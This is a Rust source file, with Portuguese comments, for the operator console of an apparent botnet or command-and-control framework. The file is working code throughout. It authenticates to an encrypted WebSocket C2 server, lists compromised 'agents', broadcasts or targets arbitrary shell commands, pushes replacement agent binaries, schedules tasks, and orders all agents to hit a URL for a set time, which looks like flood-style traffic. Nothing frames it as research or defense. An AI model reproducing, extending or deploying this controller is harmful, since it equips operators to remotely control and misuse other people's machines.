use crate::handlers::models::{Agent, C2Message};
use futures::{SinkExt, StreamExt};
use reqwest::Client;
use serde_json::{Value, json};
use std::fs;
use std::process::Command;
use std::sync::Arc;
use std::time::Duration;
use tokio::io::{AsyncBufReadExt, AsyncWriteExt, BufReader};
use tokio::sync::mpsc;
use tokio_tungstenite::tungstenite::protocol::Message as WsMessage;
use tokio_tungstenite::{WebSocketStream, connect_async};
use warp::ws::Message;
use uuid::Uuid;
use dotenv::from_filename;
use std::env;
use chacha20poly1305::{
    aead::{Aead, AeadCore, KeyInit, OsRng},
    XChaCha20Poly1305, XNonce,
};
use base64;
use chrono::{DateTime, Utc};

type WebSocketWrite = futures::stream::SplitSink<
    WebSocketStream<tokio_tungstenite::MaybeTlsStream<tokio::net::TcpStream>>,
    WsMessage,
>;

pub struct Operator {
    client: Client,
    ws_sender: mpsc::Sender<Message>,
    response_receiver: mpsc::Receiver<(String, Value, usize, usize)>,
    ws_write: Arc<tokio::sync::Mutex<WebSocketWrite>>,
    operator_key: [u8; 32],
    operator_id: String,
}

impl Operator {
    pub async fn new() -> Result<Self, Box<dyn std::error::Error>> {
        // Carregar o arquivo .env.op explicitamente
        from_filename(".env.op").ok().ok_or("Falha ao carregar o arquivo .env.op")?;

        // Verificar se todas as variáveis de ambiente necessárias estão definidas
        let server_url = "ws://localhost:80/c2".to_string();
        let operator_id = env::var("OPERATOR_ID")
            .map_err(|_| "OPERATOR_ID não está definido no .env.op")?;
        let token = env::var("OPERATOR_TOKEN")
            .map_err(|_| "OPERATOR_TOKEN não está definido no .env.op")?;
        let operator_key_b64 = env::var("OPERATOR_PRIVATE_KEY")
            .map_err(|_| "OPERATOR_PRIVATE_KEY não está definido no .env.op")?;
        
        // Decodificar a chave privada
        let operator_key = base64::decode(&operator_key_b64)
            .map_err(|_| "Erro ao decodificar OPERATOR_PRIVATE_KEY")?;
        let operator_key: [u8; 32] = operator_key.try_into()
            .map_err(|_| "Tamanho inválido da chave privada (deve ser 32 bytes)")?;

        let client = Client::new();
        let (ws_stream, _) = connect_async(&server_url).await?;
        let (write, mut read) = ws_stream.split();

        let (tx, mut rx) = mpsc::channel::<Message>(100);
        let (response_tx, response_rx) = mpsc::channel::<(String, Value, usize, usize)>(100);

        let ws_write = Arc::new(tokio::sync::Mutex::new(write));

        let ws_write_send = ws_write.clone();
        let ws_write_clone = ws_write.clone();

        // Enviar mensagem de autenticação
        let auth_msg = serde_json::to_string(&C2Message::Authenticate {
            operator_id: operator_id.clone(),
            token,
        })?;
        let mut write = ws_write.lock().await;
        write.send(WsMessage::text(auth_msg)).await?;
        drop(write);

        // Aguardar resposta de autenticação
        let mut authenticated = false;
        if let Some(Ok(msg)) = read.next().await {
            if msg.is_binary() {
                let data = msg.into_data();
                if data.len() >= 24 {
                    let nonce = XNonce::from_slice(&data[..24]);
                    let ciphertext = &data[24..];
                    let cipher = XChaCha20Poly1305::new(&operator_key.into());
                    if let Ok(plaintext) = cipher.decrypt(nonce, ciphertext) {
                        if let Ok(c2_msg) = serde_json::from_str::<C2Message>(&String::from_utf8(plaintext)?) {
                            match c2_msg {
                                C2Message::AuthResponse { success, message } => {
                                    if success {
                                        authenticated = true;
                                        println!("Autenticação bem-sucedida");
                                    } else {
                                        return Err(format!("Falha na autenticação: {}", message).into());
                                    }
                                }
                                _ => return Err("Resposta inesperada do servidor durante a autenticação".into()),
                            }
                        }
                    }
                }
            } else if let Ok(text) = msg.into_text() {
                if let Ok(c2_msg) = serde_json::from_str::<C2Message>(&text) {
                    match c2_msg {
                        C2Message::AuthResponse { success, message } => {
                            if success {
                                authenticated = true;
                                println!("Autenticação bem-sucedida");
                            } else {
                                return Err(format!("Falha na autenticação: {}", message).into());
                            }
                        }
                        _ => return Err("Resposta inesperada do servidor durante a autenticação".into()),
                    }
                }
            }
        }

        if !authenticated {
            return Err("Falha na autenticação".into());
        }

        tokio::spawn(async move {
            while let Some(msg) = read.next().await {
                match msg {
                    Ok(msg) => {
                        let text = if msg.is_binary() {
                            let data = msg.into_data();
                            if data.len() < 24 {
                                continue;
                            }
                            let nonce = XNonce::from_slice(&data[..24]);
                            let ciphertext = &data[24..];
                            let cipher = XChaCha20Poly1305::new(&operator_key.into());
                            match cipher.decrypt(nonce, ciphertext) {
                                Ok(plaintext) => String::from_utf8(plaintext).unwrap_or_default(),
                                Err(_) => continue,
                            }
                        } else if let Ok(text) = msg.into_text() {
                            text
                        } else {
                            continue;
                        };

                        if let Ok(c2_msg) = serde_json::from_str::<C2Message>(&text) {
                            match c2_msg {
                                C2Message::AgentList {
                                    agents,
                                    total,
                                    online,
                                } => {
                                    let _ = response_tx
                                        .send((
                                            "list".to_string(),
                                            serde_json::to_value(&agents).unwrap_or(json!({})),
                                            total,
                                            online,
                                        ))
                                        .await;
                                }
                                C2Message::AgentStatus { uuid, online } => {
                                    let _ = response_tx
                                        .send((
                                            "status".to_string(),
                                            json!({ "uuid": uuid, "online": online }),
                                            0,
                                            0,
                                        ))
                                        .await;
                                }
                                C2Message::AgentDetails { agent } => {
                                    let _ = response_tx
                                        .send((
                                            "details".to_string(),
                                            serde_json::to_value(&agent).unwrap_or(json!({})),
                                            0,
                                            0,
                                        ))
                                        .await;
                                }
                                C2Message::CommandResponse { output } => {
                                    let _ = response_tx
                                        .send((
                                            "response".to_string(),
                                            json!({ "output": output }),
                                            0,
                                            0,
                                        ))
                                        .await;
                                }
                                _ => {}
                            }
                        }
                    }
                    Err(e) => {
                        eprintln!("Erro de leitura no WebSocket: {}", e);
                        break;
                    }
                }
            }
            let mut write = ws_write.lock().await;
            let _ = write.close().await;
        });

        tokio::spawn(async move {
            while let Some(msg) = rx.recv().await {
                let ws_msg = if msg.is_binary() {
                    WsMessage::Binary(msg.into_bytes())
                } else if let Ok(text) = msg.to_str() {
                    WsMessage::Text(text.to_string())
                } else {
                    continue;
                };
                let mut write = ws_write_send.lock().await;
                if let Err(e) = write.send(ws_msg).await {
                    eprintln!("Erro ao enviar no WebSocket: {}", e);
                    break;
                }
            }
        });

        Ok(Operator {
            client,
            ws_sender: tx,
            response_receiver: response_rx,
            ws_write: ws_write_clone,
            operator_key,
            operator_id,
        })
    }

    pub async fn run(&mut self) -> Result<(), Box<dyn std::error::Error>> {
        let mut stdout = tokio::io::stdout();
        let stdin = BufReader::new(tokio::io::stdin());
        let mut lines = stdin.lines();

        print_banner();
        stdout.write_all(b"\nc2> ").await?;
        stdout.flush().await?;

        loop {
            tokio::select! {
                line = lines.next_line() => {
                    let line = match line? {
                        Some(line) => line.trim().to_string(),
                        None => break,
                    };

                    if line.is_empty() {
                        stdout.write_all(b"\nc2> ").await?;
                        stdout.flush().await?;
                        continue;
                    }

                    let parts: Vec<&str> = line.split_whitespace().collect();
                    match parts[0].to_lowercase().as_str() {
                        "list" => {
                            self.list().await?;
                            tokio::time::sleep(Duration::from_millis(100)).await;
                        }
                        "access" => {
                            if parts.len() == 3 {
                                if let Ok(secs) = parts[2].parse::<u64>() {
                                    self.access(parts[1], secs).await?;
                                } else {
                                    println!("Erro: <secs> deve ser um número.");
                                }
                            } else {
                                println!("Uso: access <url> <secs>");
                            }
                        }
                        "broadcast" => {
                            if parts.len() >= 2 {
                                let cmd = parts[1..].join(" ");
                                self.broadcast(&cmd).await?;
                            } else {
                                println!("Uso: broadcast <cmd>");
                            }
                        }
                        "command" => {
                            if parts.len() >= 3 {
                                let uuid = parts[1].to_string();
                                let cmd = parts[2..].join(" ");
                                self.command(&uuid, &cmd).await?;
                            } else {
                                println!("Uso: command <uuid> <cmd>");
                            }
                        }
                        "agent-software-update" => {
                            if parts.len() == 3 {
                                let version = parts[1].to_string();
                                let file_path = parts[2].to_string();
                                self.agent_software_update(&version, &file_path).await?;
                            } else {
                                println!("Uso: agent-software-update <version> <file_path>");
                            }
                        }
                        "generate-token" => {
                            if parts.len() == 2 {
                                let operator_id = parts[1].to_string();
                                self.generate_token(&operator_id).await?;
                            } else {
                                println!("Uso: generate-token <operator_id>");
                            }
                        }
                        "revoke-token" => {
                            if parts.len() == 2 {
                                let token = parts[1].to_string();
                                self.revoke_token(&token).await?;
                            } else {
                                println!("Uso: revoke-token <token>");
                            }
                        }
                        "schedule" => {
                            if parts.len() > 2 {
                                let time_str = parts[1];
                                let subcommand = parts[2].to_lowercase();
                                let execute_at = DateTime::parse_from_rfc3339(time_str)
                                    .map(|dt| dt.with_timezone(&Utc))
                                    .map_err(|e| format!("Formato de tempo inválido: {}", e));
                                match execute_at {
                                    Ok(execute_at) => {
                                        match subcommand.as_str() {
                                            "broadcast" => {
                                                if parts.len() > 3 {
                                                    let cmd = parts[3..].join(" ");
                                                    let args = serde_json::json!({
                                                        "cmd": cmd
                                                    });
                                                    let schedule_msg = serde_json::to_string(&C2Message::Command {
                                                        uuid: "server".to_string(),
                                                        cmd: format!("schedule broadcast {} {:?}", execute_at.to_rfc3339(), args),
                                                    })?;
                                                    let encrypted = self.encrypt_message(&schedule_msg).await?;
                                                    self.ws_sender.send(Message::binary(encrypted)).await?;
                                                    println!("Broadcast agendado para {}", execute_at);
                                                } else {
                                                    println!("Uso: schedule <time> broadcast <command>");
                                                }
                                            }
                                            "access" => {
                                                if parts.len() > 4 {
                                                    let url = parts[3];
                                                    let secs = parts[4].parse::<u64>().map_err(|_| "Segundos inválidos")?;
                                                    let args = serde_json::json!({
                                                        "url": url,
                                                        "duration_secs": secs
                                                    });
                                                    let schedule_msg = serde_json::to_string(&C2Message::Command {
                                                        uuid: "server".to_string(),
                                                        cmd: format!("schedule access {} {:?}", execute_at.to_rfc3339(), args),
                                                    })?;
                                                    let encrypted = self.encrypt_message(&schedule_msg).await?;
                                                    self.ws_sender.send(Message::binary(encrypted)).await?;
                                                    println!("Acesso agendado para {}", execute_at);
                                                } else {
                                                    println!("Uso: schedule <time> access <url> <secs>");
                                                }
                                            }
                                            _ => {
                                                println!("Comando de agendamento inválido. Use: schedule <time> [broadcast|access] <args>");
                                            }
                                        }
                                    }
                                    Err(e) => {
                                        println!("{}", e);
                                    }
                                }
                            } else {
                                println!("Uso: schedule <time> [broadcast|access] <args>");
                            }
                        }
                        "clear" => {
                            if cfg!(target_os = "windows") {
                                Command::new("cls").status().expect("Erro ao executar comando.");
                            } else {
                                Command::new("clear").status().expect("Erro ao executar comando.");
                            }
                        }
                        "exit" => {
                            println!("Saindo do shell...");
                            let mut write = self.ws_write.lock().await;
                            if let Err(e) = write.close().await {
                                eprintln!("Erro ao fechar WebSocket: {}", e);
                            }
                            break;
                        }
                        "help" => {
                            println!("Comandos disponíveis:");
                            println!("  list                  - Lista todos os agentes");
                            println!("  access <url> <secs>   - Ordena que os agentes acessem uma URL por <secs> segundos");
                            println!("  broadcast <cmd>       - Envia um comando para todos os agentes");
                            println!("  command <uuid> <cmd>  - Envia um comando para um agente específico");
                            println!("  agent-software-update <version> <file_path> - Atualiza o software do agente com o binário do arquivo");
                            println!("  schedule <time> [broadcast|access] <args> - Agenda um comando de broadcast ou acesso");
                            println!("  clear                 - Limpa o terminal");
                            println!("  exit                  - Sai do shell");
                            println!("  help                  - Mostra esta ajuda");
                        }
                        _ => {
                            println!("Comando desconhecido: {}. Digite 'help' para ver os comandos.", parts[0]);
                        }
                    }
                    stdout.write_all(b"\nc2> ").await?;
                    stdout.flush().await?;
                }
                Some((kind, value, total, online)) = self.response_receiver.recv() => {
                    match kind.as_str() {
                        "list" => {
                            let agents: Vec<Agent> = serde_json::from_value(value)
                                .map_err(|e| format!("Erro de desserialização: {}", e))?;
                            for agent in &agents {
                                println!("{}", agent);
                            }
                            println!("\n[+] {total} agentes registrados ({online} online).");
                            stdout.write_all(b"\nc2> ").await?;
                            stdout.flush().await?;
                        }
                        "details" => {
                            if let Ok(agent) = serde_json::from_value::<Option<Agent>>(value) {
                                if let Some(agent) = agent {
                                    println!("Agente encontrado: {}. Digite comandos (digite 'exit' para parar):", agent.uuid);
                                } else {
                                    println!("Agente não encontrado.");
                                }
                            }
                            stdout.write_all(b"\nc2> ").await?;
                            stdout.flush().await?;
                        }
                        "response" => {
                            if let Ok(response) = serde_json::from_value::<Value>(value) {
                                if let Some(output) = response.get("output") {
                                    println!("Saída do comando: {}", output);
                                }
                            }
                            stdout.write_all(b"\nc2> ").await?;
                            stdout.flush().await?;
                        }
                        _ => {}
                    }
                }
            }
        }
        Ok(())
    }

    async fn list(&mut self) -> Result<(), Box<dyn std::error::Error>> {
        let msg = serde_json::to_string(&C2Message::RequestAgentList)?;
        let encrypted = self.encrypt_message(&msg).await?;
        self.ws_sender.send(Message::binary(encrypted)).await?;
        Ok(())
    }

    async fn access(&self, url: &str, secs: u64) -> Result<(), Box<dyn std::error::Error>> {
        if !url.starts_with("http://") && !url.starts_with("https://") {
            return Err("URL inválida: deve começar com http:// ou https://".into());
        }
        let access_cmd = json!({
            "action": "access",
            "url": url,
            "duration_secs": secs
        })
        .to_string();
        let broadcast_msg = serde_json::to_string(&C2Message::Broadcast { cmd: access_cmd })?;
        let encrypted = self.encrypt_message(&broadcast_msg).await?;
        self.ws_sender.send(Message::binary(encrypted)).await?;
        println!("Ordenado a todos os agentes acessarem {} por {} segundos", url, secs);
        Ok(())
    }

    async fn broadcast(&self, cmd: &str) -> Result<(), Box<dyn std::error::Error>> {
        let broadcast_msg = serde_json::to_string(&C2Message::Broadcast {
            cmd: cmd.to_string(),
        })?;
        let encrypted = self.encrypt_message(&broadcast_msg).await?;
        self.ws_sender.send(Message::binary(encrypted)).await?;
        println!("Comando transmitido: {}", cmd);
        Ok(())
    }

    async fn command(&self, uuid: &str, cmd: &str) -> Result<(), Box<dyn std::error::Error>> {
        let command_msg = serde_json::to_string(&C2Message::Command {
            uuid: uuid.to_string(),
            cmd: cmd.to_string(),
        })?;
        let encrypted = self.encrypt_message(&command_msg).await?;
        self.ws_sender.send(Message::binary(encrypted)).await?;
        println!("Comando enviado ao agente {}: {}", uuid, cmd);
        Ok(())
    }

    async fn agent_software_update(
        &self,
        version: &str,
        file_path: &str,
    ) -> Result<(), Box<dyn std::error::Error>> {
        let binary = fs::read(file_path)?;
        let msg = serde_json::to_string(&C2Message::AgentSoftwareUpdateWithBinary {
            version: version.to_string(),
            binary,
        })?;
        let encrypted = self.encrypt_message(&msg).await?;
        self.ws_sender.send(Message::binary(encrypted)).await?;
        println!("Comando de atualização de software enviado: versão={}", version);
        Ok(())
    }

    async fn generate_token(&self, operator_id: &str) -> Result<(), Box<dyn std::error::Error>> {
        let token = Uuid::new_v4().to_string();
        let msg = serde_json::to_string(&C2Message::Command {
            uuid: "server".to_string(),
            cmd: format!("generate-token {} {}", operator_id, token),
        })?;
        let encrypted = self.encrypt_message(&msg).await?;
        self.ws_sender.send(Message::binary(encrypted)).await?;
        println!("Token gerado para o operador {}: {}", operator_id, token);
        Ok(())
    }

    async fn revoke_token(&self, token: &str) -> Result<(), Box<dyn std::error::Error>> {
        let msg = serde_json::to_string(&C2Message::Command {
            uuid: "server".to_string(),
            cmd: format!("revoke-token {}", token),
        })?;
        let encrypted = self.encrypt_message(&msg).await?;
        self.ws_sender.send(Message::binary(encrypted)).await?;
        println!("Token revogado: {}", token);
        Ok(())
    }

    async fn encrypt_message(&self, message: &str) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
        let cipher = XChaCha20Poly1305::new(&self.operator_key.into());
        let nonce = XChaCha20Poly1305::generate_nonce(&mut OsRng);
        let mut ciphertext = cipher.encrypt(&nonce, message.as_bytes()).unwrap();
        let mut result = nonce.to_vec();
        result.append(&mut ciphertext);
        Ok(result)
    }
}

fn print_banner() {
    println!(
        r#"
                                                          
          @                                               
         @@@@ @                                           
        %@@@@@@@%                                         
         @@@@@@@@@@@                                      
       %%%%@@@@@@@@@@%%%%                                 
        %%%@%%@@@@@@@@@%%%%%        # ##****%             
         %@%%%@@%@@@@@@@@%%%%%  %%%#####%##%#             
           %%%@@@%@@@@@@@@@@@%#%###%%@%%%%%%#*            
            %%%%%%%%%%@@@@@@@@@%#%%@@%%%@@%%@%#           
              %%%%%%%%%@@@@@@@@%%%@%%%%%%@@@@@@#          
              %#%%%%#%%%%%%%%%%%%%%%##%%%@   @@@          
                  *****####%%%%%%%%%##*#%%                
                    *+++***##%%%%%%%##***#                
                   ++++=++*%%%%%%%%%%%%%%%@               
              *****###%###%%%@@@@%%@%###@@@               
             %%@%%%%%%%%%%%%@%@@@@@@@%@@@@%%@@@%%         
            %@@@%@@@%%%@@@@@@%@@@@@@@@@@@@@@@@@@@@        
           %@@@@@@@@@%@@@@@@@@@@@%%          @@ @@        
         %%@@@@% @@@@@@@@@                  @@  @@        
        %%@@@%%@@@@@@@@@@               @@@@@@ @@@        
       %%@@@@@@@@@@@@@%                       @@@         
      %%@@%%@@   @@@@                                     
    %%@@%%%@@   @@@@                                      
   @%%%%%%%@     @@@                                      
   @%@ @%%@       @%@                                     
       %%@         %%%                                    
                     %%%                                  
                                                          
                                                          
                ██▄   ████▄ █▀▄▀█ ▄█    ▄  ▄█ 
                █  █  █   █ █ █ █ ██     █ ██ 
                █   █ █   █ █ ▄ █ ██ ██  █ ██ 
                █  █  ▀████ █   █ ▐█ █ █ █ ▐█ 
                ███▀           █   ▐ █  ██  ▐ 
                              ▀      █  ██    
                              
"#
    );
}
